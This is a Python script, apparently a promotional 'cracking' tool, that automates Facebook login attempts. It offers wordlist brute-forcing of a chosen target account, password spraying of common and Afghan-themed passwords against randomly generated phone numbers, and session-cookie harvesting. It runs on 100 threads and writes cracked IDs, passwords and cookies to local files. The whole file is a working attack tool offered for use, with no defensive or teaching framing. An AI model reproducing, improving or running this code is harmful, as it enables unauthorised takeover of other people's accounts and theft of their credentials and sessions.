# CODED AND DESIGNED BY MORTEZA ALIZADA
# MESSAGE TO COPY PASTER: PLZ FOLLOW MY GITHUB ACCOUNT AND MY YOUTUBE ALSO MY INSTAGRAM
import re
import os
import sys
import time
import string
import random 
import platform
import subprocess
import base64
import marshal
import zlib
import zipfile
import hashlib
import getpass
import typing
import datetime
import py_compile
import socket
# EXTERNAL LIBRARIES....
try:
    import requests
    import bs4
    import colorama
    import psutil
    import pyfiglet
except Exception as Error:
    print("[⚠️] REQUIREMENTS NOT INSTALLED.......")
    os.system("pip install requests colorama bs4 pyfiglet psutil")

finally:
    import requests
    import bs4
    import colorama
    import psutil
    import pyfiglet

from colorama import Fore,Back
from pyfiglet import figlet_format
from typing import Final
from concurrent.futures import ThreadPoolExecutor



# COLORS AND GLOBAL VARIABLES.....
WHITE = Fore.WHITE
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
BLACK = Fore.BLACK


loop = 0
ok = []
cp = []
user = []
pwx = []
ugen = []


logo = f"""
{random.choice([GREEN, RED, WHITE])}{figlet_format("MORTEZA")}
\033[1;32m╔\033[1;32m𓆩M𓆪\033[1;32m══════════════════[\033[37;41m𓆩 𝐌𝐎𝐑𝐓𝐄𝐙𝐀 𓆪\033[0m\033[1;32m]════════════════\033[1;32m𓆩M𓆪\033[1;32m╗
\033[1;32m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;37m➟   \033[1;32mMORTEZA ALIZADA                    \033[1;32m│
\033[1;32m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;37m➟   \033[1;32mMORTAZA ALIZADA                    \033[1;32m│
\033[1;32m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;37m ➟  \033[1;32m MORTEZA-KING-007                  \033[1;32m │
\033[1;32m│\033[1;37m☞  \033[1;32mVERSION   \033[1;37m ➟   \033[1;32m1.5 Pro                        \033[1;32m    │
\033[1;32m│\033[1;37m☞  \033[1;32mSTATUS    \033[1;37m ➟   \033[1;32mPAID                           \033[1;32m    │
\033[1;32m╚\033[1;32m𓆩M𓆪\033[1;32m═════\033[41m\033[1;37m[ 𓆩 𝐈𝐅 𝐘𝐎𝐔𝐑 𝐁𝐀𝐃,𝐒𝐎 𝐈 𝐀𝐌 𝐘𝐎𝐔𝐑 𝐃𝐀𝐃𓆪 ]\033[0m\033[1;32m═══════\033[1;32m𓆩M𓆪\033[1;32m╝
"""



def fake_user(model=random.choice(["S23", "S24"])):
    android_versions = ["13", "14", "15"]
    chrome_major = random.randint(120, 130)
    chrome_minor = random.randint(0, 9999)
    build_codes = ["TP1A", "UP1A", "AP1A", "SP1A"]

    # Choose build code and Android version
    build = random.choice(build_codes)
    android_version = random.choice(android_versions)

    # Choose model family
    if model.upper() == "S23":
        device = random.choice(["SM-S911B", "SM-S916B", "SM-S918B"])  # S23 / S23+ / S23 Ultra
    elif model.upper() == "S24":
        device = random.choice(["SM-S921B", "SM-S926B", "SM-S928B"])  # S24 / S24+ / S24 Ultra
    else:
        raise ValueError("Model must be 'S23' or 'S24'")

    # Construct user agent
    ua = (
        f"Mozilla/5.0 (Linux; Android {android_version}; {device}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{chrome_major}.0.{chrome_minor}.141 Mobile Safari/537.36"
    )
    return ua

def facebook(uid, pwx):
    # CODED BY MORTEZA ALIZADA
    # FOLLOW MY GITHUB ACCOUNT
    global loop
    global ok
    global fake_user
    global cp
    try:
        for ps in pwx:
            session = requests.Session()
            
            sys.stdout.write(f'\r\r{WHITE}[MORTEZA-ALIZADA 🔥] [%s] {WHITE}[{GREEN}OK:%s{WHITE}/{RED}CP:%s{WHITE}]'%(loop, len(ok), len(cp)))
            sys.stdout.flush()
            free = session.get('https://mbasic.facebook.com').text

            
            log = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(free)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(free)).group(1),
                    "email": uid,
                    "pass": ps,
                    "login": "Log In"
            }
                        
            headers = {
                'authority': 'www.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,en-IN;q=0.6,zh-HK;q=0.5,zh;q=0.4,fa-AF;q=0.3',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-site',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                #'user-agent': str(fake_user())
            }

            log = session.post('https://www.facebook.com/login.php?__mmr=1&_rdr', data=log, headers=headers).text
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                cki = ';'.join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ckii = cki.split("1000")[1]
                cid = "1000"+ckii[0:11]
                print(f'\r{GREEN}[MORTEZA-OK 🌸] {cid} | {ps}')
                print(f'{YELLOW}[COOKIES 🍪] {cki}')
                open('MORTEZA-OK.txt', 'a').write(f'{cid} | {uid} | {ps}')
                ok.append(cid)
                break
            elif "checkpoint" in log_cookies:
                cki = ';'.join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ckii = cki.split("1000")[1]
                cid = "1000"+ckii[0:11]
                print(f'\r{RED}[MORTEZA-CP 💣] {cid} | {ps}')
                open('MORTEZA-CP.txt', 'a').write(f'{cid} | {uid} | {ps}')
                cp.append(cid)
            else:
                pass
                loop += 1

    except Exception as Error:
        # print(Error)
        pass




def clear():
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        sys.stdout.write(f'\r{logo}')
        sys.stdout.flush()
    

        
def liner(int=50):
    print(int * f'{WHITE}=')


def date_check():
    hour  = datetime.datetime.now().hour
    if 4 < hour <= 12:
        tag = "[GOOD MORNING]"
    elif 12 < hour <= 15:
        tag = "[GOOD AFTERNOON]"
    elif 15 < hour <= 18:
         tag = "[GOOD EVENING]"
    else:
        tag = "[GOOD NIGHT]"
    return tag



def check_for_update():
    print(f"{WHITE}[⬆️] Checking for update wait..........")
    os.system("git pull")



def key_manager():
	clear()
	liner(50)
	x_key_x = input(f'{WHITE}[👌] ENTER YOUR KEY HERE: ')
	try:
		r = requests.get("https://github.com/MORTEZA-KING-007/DATABASE/key.txt").text
	except:
		r = " "
		pass
	if r in ["MORTEZA-FREE-KEY-XXXX-XXXX-XXXX"]:
		pass
	elif x_key_x in ["MORTEZA-FREE-KEY-XXXX-XXXX-XXXX"]:
		pass
	else:
		print(f"{RED}\n\t\t[💀] KEY EXPIRED OR NOT FOUND IN DATABASE [💀]")
		sys.exit()


def get_info():
    name = platform.node()
    bit = platform.architecture()[0]
    charge = psutil.sensors_battery()[0]
    isCharging = psutil.sensors_battery()[2]
    ram = round(psutil.virtual_memory().total/(1024**3))
    stor = round(psutil.disk_usage("/").total/(1024**3))
    return [name, bit, charge, isCharging, ram, stor]


def writer(text):
    for i in text + "\r":
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)
    



def main():
    clear()
    liner()
    print(f'{WHITE}[{YELLOW}01{WHITE}]{WHITE} TARGET PASSWORD CRACKING (WORDLIST)')
    print(f'{WHITE}[{YELLOW}02{WHITE}]{WHITE} RANDOM TARGET CRACKING (SIM+R_N)')
    print(f'{WHITE}[{YELLOW}03{WHITE}]{WHITE} GENERATE ACCOUNT COOKIES')
    print(f'{WHITE}[{YELLOW}00{WHITE}]{RED} EXIT FROM TOOL')
    liner()
    ch = input(f"{GREEN}[✅] CHOOSE ANY OPTION :-> ")
    if ch == "01" or ch == "1":
        target_down()
    elif ch == "02" or ch == "2":
        random_crack()
    elif ch == "03" or ch == "3":
        cookie_generator()
    elif ch == "00" or ch == "0":
        os.system("cls")
        print("\n\t[💀] HAVE A GOOD TIME DO NOT WASTE UR TIME [💀]")
        sys.exit()
    else:
        main()


def target_down():
    clear()
    liner()
    print(f'{WHITE}[✅] PUT YOUR TARGET ACCOUNT PHONE/FB-UID')
    liner()
    uid = input(f'{WHITE}[👌] PUT TARGET HERE: ')
    clear()
    liner()
    print(f'{WHITE}[✅] PUT YOUR FILE PATH HERE')
    liner()
    file = input(f'{WHITE}[👌] PUT FILE PATH HERE: ')
    file_ = f"{file}"
    for line in open(file_, "r").readlines():
        if len(line.strip()) <= 3:
            pass
        elif line.strip() == " " or line.strip() == "":
            pass
        else:
            pwx.append(line.strip())
    
    clear()
    liner()
    liner(60)
    print(f'{WHITE}[✅] INFO ABOUT TARGET    : {uid}')
    print(f'{WHITE}[✅] TOTAL PASSWORDS      : {str(len(pwx))}')
    print(f'{WHITE}[✅] USER DEVICE NAME     : {str(platform.node())}')
    print(f'{WHITE}[✅] USER DEVICE BIT      : {str(platform.architecture()[0])}')
    #print(f'{WHITE}[✅] USER BATTERY CHARGE  : {str(psutil.sensors_battery()[0])}%')
    #print(f'{WHITE}[✅] USER DEVICE RAM      : {str(int(round(psutil.virtual_memory().total/(1024**3))))} GB')
    print()
    with ThreadPoolExecutor(max_workers=100) as mr_robot:
        for ps in range(len(pwx)):
            mr_robot.submit(facebook, uid, pwx)
    print()
    pwx.clear()
    liner(60)
    print(f'{WHITE}[✅] PROCESS COMPLETED SUCCESSFULLY')
    print(f'{WHITE}[✅] TOTAL OK ID       : {GREEN}{str(len(ok))}')
    print(f'{WHITE}[✅] TOTAL CP ID       : {RED}{str(len(cp))}')
    print(f'{WHITE}[✅] DO NOT FORGET LIKE AND SUBSCRIBE MY YOUTUBE AND INSTAGRAM')
    liner(60)
    input(f"{WHITE}[✅] ENTER ANY KEY TO RETURN MAIN MENU : ")
    if os.name == "nt":
        subprocess.getoutput("start https://www.youtube.com/@morteza-king-007")
        time.sleep(2)
        subprocess.getoutput("start https://www.instagram.com/@morteza.king_007")
    else:
        subprocess.getoutput("xdg-open https://www.youtube.com/@morteza-king-007")
        time.sleep(2)
        subprocess.getoutput("xdg-open https://www.instagram.com/@morteza.king_007")
    main()


def random_crack():
    clear()
    liner()
    print(f'{WHITE}[✅] PUT YOUR LIMIT .eg: 1000, 2000. 3000. 40000')
    liner()
    limit = int(input(f'{WHITE}[👌] PUT LIMIT HERE: '))
    for i in range(limit):
        user.append(''.join(random.choice(string.digits) for _ in range(7)))
    
    clear()
    liner()
    print(f'{WHITE}[✅] PUT YOUR CODE .eg: 070, 096, 052, 076, 078')
    liner()
    clear()
    liner()
    code = input(f'{WHITE}[👌] PUT CODE HERE: ')
    clear()
    liner()
    liner(60)
    print(f'{WHITE}[✅] TOTAL TARGET         : {str(len(user))}')
    print(f'{WHITE}[✅] SIM CODE YOU PUT     : {str(code)}')
    print(f'{WHITE}[✅] USER DEVICE NAME     : {str(platform.node())}')
    print(f'{WHITE}[✅] USER DEVICE BIT      : {str(platform.architecture()[0])}')
    #print(f'{WHITE}[✅] USER BATTERY CHARGE  : {str(psutil.sensors_battery()[0])}%')
    #print(f'{WHITE}[✅] USER DEVICE RAM      : {str(int(round(psutil.virtual_memory().total/(1024**3))))} GB')
    liner(60)
    print()
    with ThreadPoolExecutor(max_workers=100) as mr_robot:
        for num in user:
            uid = str(code+num)
            pwx = [uid, num, '۱۰۰۲۰۰', '۱۲۳۴۵۶', '۱۲۳۴۵۶۷۸۹', '100200', '123456', '123456789', 'afghanistan123', 'afghanistan', 'afghan123', 'king123', 'afghan', 'khan123', 'khankhan']
            mr_robot.submit(facebook, uid, pwx)
    print()
    pwx.clear()
    liner(60)
    print(f'{WHITE}[✅] PROCESS COMPLETED SUCCESSFULLY')
    print(f'{WHITE}[✅] TOTAL OK ID       : {GREEN}{str(len(ok))}')
    print(f'{WHITE}[✅] TOTAL CP ID       : {RED}{str(len(cp))}')
    print(f'{WHITE}[✅] DO NOT FORGET LIKE AND SUBSCRIBE MY YOUTUBE AND INSTAGRAM')
    liner(60)
    input(f"{WHITE}[✅] ENTER ANY KEY TO RETURN MAIN MENU : ")

    main()

def cookie_generator():
    clear()
    liner()
    print(f'{WHITE}[✅] PUT YOUR TARGET ACCOUNT PHONE/FB-UID')
    liner()
    uid = input(f'{WHITE}[👌] PUT TARGET HERE: ')
    clear()
    liner()
    password = input(f'{WHITE}[👌] PUT ACCOUNT PASSWORD HERE: ')
    
    clear()
    liner()
    liner(60)
    print(f'{WHITE}[✅] INFO ABOUT TARGET    : {uid}')
    print(f'{WHITE}[✅] USER DEVICE NAME     : {str(platform.node())}')
    print(f'{WHITE}[✅] USER DEVICE BIT      : {str(platform.architecture()[0])}')
    #print(f'{WHITE}[✅] USER BATTERY CHARGE  : {str(psutil.sensors_battery()[0])}%')
    #print(f'{WHITE}[✅] USER DEVICE RAM      : {str(int(round(psutil.virtual_memory().total/(1024**3))))} GB')
    liner()
    print()
    try:
        pwx = [password]
        facebook(uid, pwx)
    except Exception as Error:
        print(f'{WHITE}\n\t[💀]CONNECTION PROBLEM OR WRONG USERNAME/PASSWORD[💀]')
    print()
    pwx.clear()
    liner(60)
    print(f'{WHITE}[✅] PROCESS COMPLETED SUCCESSFULLY')
    print(f'{WHITE}[✅] TOTAL OK ID       : {GREEN}{str(len(ok))}')
    print(f'{WHITE}[✅] TOTAL CP ID       : {RED}{str(len(cp))}')
    print(f'{WHITE}[✅] DO NOT FORGET LIKE AND SUBSCRIBE MY YOUTUBE AND INSTAGRAM')
    liner(60)
    input(f"{WHITE}[✅] ENTER ANY KEY TO RETURN MAIN MENU : ")
    main()

if __name__ == "__main__":
    key_manager()
    check_for_update()
    main()
